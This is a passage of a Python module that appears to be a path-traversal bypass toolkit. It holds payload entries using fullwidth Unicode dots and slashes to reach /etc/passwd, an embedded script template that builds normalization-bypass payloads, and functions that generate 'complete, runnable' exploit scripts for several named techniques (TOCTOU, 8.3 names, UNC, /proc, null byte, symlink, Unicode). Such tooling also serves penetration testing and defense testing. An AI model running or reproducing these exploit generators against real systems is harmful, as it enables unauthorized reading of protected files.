        requires="target performs Unicode NFKC normalization before filesystem access",
        description=(
            "Fullwidth dot (U+FF0E) normalizes to ASCII dot (U+002E) under NFKC. "
            "If the defense checks before normalization but the filesystem or "
            "framework normalizes, the traversal dots appear after the check."
        ),
        severity="medium",
    ),
    BypassPayload(
        technique="unicode-halfwidth-slash",
        payload="..\uff0f..\uff0f..\uff0fetc/passwd",
        platform="any",
        requires="target performs Unicode NFKC normalization on path separators",
        description=(
            "Fullwidth solidus (U+FF0F) normalizes to / under NFKC. Similar to "
            "the fullwidth dot attack but targets the separator."
        ),
        severity="medium",
    ),
]

_UNICODE_SCRIPT = r'''#!/usr/bin/env python3
"""Unicode normalization bypass for path traversal defenses.

Target base: %%BASE%%
Goal: read %%GOAL%%

Tests whether Unicode normalization (NFKC/NFKD) of dots and slashes
can bypass path traversal defenses. The attack surface is at the boundary
between the web framework (which may normalize) and the filesystem check.
"""
import os
import sys
import unicodedata

BASE_DIR = "%%BASE%%"
GOAL_FILE = "%%GOAL%%"

DOT_VARIANTS = [
    "\u002e",       # ASCII dot (baseline)
    "\uff0e",       # Fullwidth dot
    "\u2024",       # One dot leader
    "\u0307",       # Combining dot above (needs base char)
]

SLASH_VARIANTS = [
    "\u002f",       # ASCII forward slash
    "\uff0f",       # Fullwidth solidus
    "\u2044",       # Fraction slash
    "\u2215",       # Division slash
    "\u29f8",       # Big solidus
]

BACKSLASH_VARIANTS = [
    "\u005c",       # ASCII backslash
    "\uff3c",       # Fullwidth backslash
    "\u2216",       # Set minus (looks like backslash)
    "\ufe68",       # Small reverse solidus
]


def nfkc(s):
    return unicodedata.normalize("NFKC", s)


def nfkd(s):
    return unicodedata.normalize("NFKD", s)


def main():
    print("[*] Testing Unicode normalization bypasses...")
    print("[*] Base: %s" % BASE_DIR)
    print("[*] Goal: %s" % GOAL_FILE)

    bypasses = []

    for dot in DOT_VARIANTS:
        for sep in SLASH_VARIANTS + BACKSLASH_VARIANTS:
            # Build traversal: dot dot sep dot dot sep dot dot sep
            dotdot = dot + dot
            payload = dotdot + sep + dotdot + sep + dotdot + sep + "etc" + sep + "passwd"

            # Check if NFKC normalization produces the real traversal
            normalized = nfkc(payload)
            contains_traversal = ".." in normalized and ("/" in normalized or "\\" in normalized)

            if contains_traversal and payload != normalized:
                # The raw payload looks different from the normalized form
                # A defense checking the raw payload won't see ../
                has_raw_dotdot = ".." in payload
                if not has_raw_dotdot:
                    bypasses.append((payload, normalized, dot, sep))
                    print("[!] Bypass candidate: %s" % repr(payload[:60]))
                    print("    NFKC normalizes to: %s" % repr(normalized[:60]))

    if bypasses:
        print("\n[+] Found %d Unicode normalization bypasses:" % len(bypasses))
        for payload, normalized, dot, sep in bypasses[:10]:
            print("    dot=U+%04X sep=U+%04X" % (ord(dot), ord(sep)))
            print("    Raw:  %s" % repr(payload[:80]))
            print("    NFKC: %s" % repr(normalized[:80]))

            # Test against realpath defense
            try:
                resolved = os.path.realpath(os.path.join(BASE_DIR, payload))
                real_base = os.path.realpath(BASE_DIR)
                escapes = (not resolved.startswith(real_base + os.sep)
                           and resolved != real_base)
                print("    Escapes realpath: %s (resolved: %s)" % (escapes, resolved[:60]))
            except (OSError, ValueError) as e:
                print("    realpath error: %s" % e)

        print("\n[*] These bypasses work when the target normalizes AFTER the check")
        print("[*] Web frameworks (Django, Flask, Tomcat) may normalize at different stages")
        sys.exit(0)
    else:
        print("[-] No Unicode normalization bypasses found for this target")
        sys.exit(1)


if __name__ == "__main__":
    main()
'''


# --------------------------------------------------------------------------- #
# Public API
# --------------------------------------------------------------------------- #

_ALL_PAYLOADS: list[BypassPayload] = (
    _TOCTOU_PAYLOADS
    + _CASE_PAYLOADS
    + _SHORT_NAME_PAYLOADS
    + _UNC_PAYLOADS
    + _PROC_PAYLOADS
    + _NULL_PAYLOADS
    + _SYMLINK_PAYLOADS
    + _SEPARATOR_PAYLOADS
    + _UNICODE_PAYLOADS
)

_TECHNIQUE_SCRIPTS: dict[str, tuple[str, str, str]] = {
    # technique_prefix -> (template, platform, description)
    "toctou":         (_TOCTOU_SCRIPT,      "linux",   "TOCTOU symlink race"),
    "case":           (_CASE_SCRIPT,        "windows", "Case sensitivity confusion"),
    "8dot3":          (_SHORT_NAME_SCRIPT,   "windows", "NTFS 8.3 short name"),
    "unc":            (_UNC_SCRIPT,          "windows", "UNC/extended-length path"),
    "proc":           (_PROC_SCRIPT,         "linux",   "/proc/self/* traversal"),
    "null":           (_NULL_SCRIPT,         "linux",   "Null byte truncation"),
    "symlink":        (_SYMLINK_SCRIPT,      "any",     "Symlink planted in base dir"),
    "unicode":        (_UNICODE_SCRIPT,      "any",     "Unicode normalization"),
}


def all_payloads(platform_filter: str | None = None) -> list[BypassPayload]:
    """Return all bypass payloads, optionally filtered by platform."""
    if platform_filter is None:
        return list(_ALL_PAYLOADS)
    pf = platform_filter.lower()
    return [p for p in _ALL_PAYLOADS
            if p.platform == "any" or p.platform == pf]


def payloads_by_technique(technique: str) -> list[BypassPayload]:
    """Return payloads for a specific technique prefix."""
    return [p for p in _ALL_PAYLOADS if p.technique.startswith(technique)]


def techniques() -> list[str]:
    """Return all available technique names."""
    return sorted(set(p.technique for p in _ALL_PAYLOADS))


def generate_script(technique: str, base_dir: str,
                    goal_file: str = "/etc/passwd") -> BypassScript | None:
    """Generate a complete exploit script for a bypass technique.

    Args:
        technique: one of the keys from techniques() or a prefix
                   ("toctou", "case", "8dot3", "unc", "proc", "null",
                    "symlink", "unicode")
        base_dir: the target application's base directory for file access
        goal_file: the file we want to read outside the base directory

    Returns:
        BypassScript with complete, runnable Python code, or None if
        the technique is not recognized.
    """
    for prefix, (template, plat, desc) in _TECHNIQUE_SCRIPTS.items():
        if technique.startswith(prefix) or prefix.startswith(technique):
            code = _fill(template, BASE=base_dir, GOAL=goal_file)
            return BypassScript(
                technique=technique,
                code=code,
                platform=plat,
                requires=next(
                    (p.requires for p in _ALL_PAYLOADS
                     if p.technique.startswith(prefix)),
                    "see payload list"),
                description=desc,
                references=_refs(),
            )
    return None


def generate_all_scripts(base_dir: str,
                         goal_file: str = "/etc/passwd",
                         platform_filter: str | None = None,
                         ) -> list[BypassScript]:
    """Generate exploit scripts for all techniques applicable to a platform."""
    scripts = []
    for prefix, (template, plat, desc) in _TECHNIQUE_SCRIPTS.items():
        if platform_filter and plat != "any" and plat != platform_filter:
            continue
        code = _fill(template, BASE=base_dir, GOAL=goal_file)
        reqs = next(
            (p.requires for p in _ALL_PAYLOADS
             if p.technique.startswith(prefix)),
            "see payload list")
        scripts.append(BypassScript(
            technique=prefix,
            code=code,
            platform=plat,
            requires=reqs,
            description=desc,
            references=_refs(),
        ))
    return scripts


def detect_platform() -> str:
    """Detect the current platform for payload filtering."""
    system = platform.system().lower()
    if system == "windows":
        return "windows"
    elif system == "darwin":
        return "macos"
    elif system == "linux":
        return "linux"
    return "unknown"
